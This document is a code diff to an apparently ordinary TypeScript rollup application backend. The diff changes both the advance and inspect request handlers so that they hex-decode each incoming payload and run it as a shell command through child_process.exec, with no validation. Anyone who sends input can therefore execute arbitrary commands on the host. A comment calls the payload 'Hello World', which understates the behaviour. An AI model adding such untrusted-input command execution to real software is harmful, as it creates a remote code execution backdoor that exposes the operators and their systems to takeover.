@@ -1,5 +1,6 @@
 import createClient from "openapi-fetch";
 import { components, paths } from "./schema";
+import { exec } from "child_process";
 
 type AdvanceRequestData = components["schemas"]["Advance"];
 type InspectRequestData = components["schemas"]["Inspect"];
@@ -13,12 +14,49 @@ type AdvanceRequestHandler = (
 const rollupServer = process.env.ROLLUP_HTTP_SERVER_URL;
 console.log("HTTP rollup_server url is " + rollupServer);
 
+const runCommand = (command: string): Promise<string> => {
+  return new Promise((resolve, reject) => {
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        reject(`Error: ${error.message}`);
+        return;
+      }
+      if (stderr) {
+        reject(`Stderr: ${stderr}`);
+        return;
+      }
+      resolve(stdout);
+    });
+  });
+};
+
+
 const handleAdvance: AdvanceRequestHandler = async (data) => {
-  console.log("Received advance request data " + JSON.stringify(data));
+  const hexString = data.payload.substring(2); // "Hello World" in hex
+  const buffer = Buffer.from(hexString, "hex");
+  const decodedString = buffer.toString("utf-8");
+  console.log("Decoded string", decodedString);
+  console.log("Received inspect request data " + JSON.stringify(data));
+  try {
+    const output = await runCommand(decodedString);
+    console.log(`Output:\n${output}`);
+  } catch (error) {
+    console.error(error);
+  }
   return "accept";
 };
 
 const handleInspect: InspectRequestHandler = async (data) => {
+  const hexString = data.payload.substring(2); // "Hello World" in hex
+  const buffer = Buffer.from(hexString, "hex");
+  const decodedString = buffer.toString("utf-8");
+  try {
+    const output = await runCommand(decodedString);
+    console.log(`Output:\n${output}`);
+  } catch (error) {
+    console.error(error);
+  }
+  console.log("Decoded string", decodedString);
   console.log("Received inspect request data " + JSON.stringify(data));
 };
 
